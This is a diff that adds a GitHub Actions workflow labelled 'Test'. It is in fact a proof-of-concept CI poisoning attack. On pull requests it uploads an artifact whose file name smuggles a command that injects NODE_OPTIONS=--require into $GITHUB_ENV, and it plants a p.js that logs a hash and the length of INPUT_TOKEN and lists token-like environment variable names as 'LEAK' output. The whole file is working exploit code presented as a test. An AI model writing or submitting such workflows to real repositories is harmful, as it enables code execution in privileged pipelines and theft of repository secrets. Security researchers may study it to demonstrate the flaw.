@@ -1,0 +1,26 @@
+name: Test
+
+on:
+  pull_request:
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build forged artifact
+        run: |
+          mkdir -p content
+          printf 'forged report body' > content/summary.txt
+          : > 'content/x;echo${IFS}NODE_OPTIONS=--require${IFS}${PATH:0:1}tmp${PATH:0:1}content${PATH:0:1}content${PATH:0:1}p.js>>$GITHUB_ENV;#.txt'
+          cat > content/p.js <<'JSEOF'
+          const c = require('crypto');
+          const t = String(process.env.INPUT_TOKEN || 'NONE');
+          console.log('LEAK-SHA ' + c.createHash('sha256').update(t).digest('hex'));
+          console.log('LEAK-LEN ' + t.length);
+          console.log('LEAK-INPUTS ' + Object.keys(process.env).filter(k => k.startsWith('INPUT') || k.includes('TOKEN')).join(','));
+          JSEOF
+          ls -la content
+      - uses: actions/upload-artifact@v4
+        with:
+          name: content
+          path: content
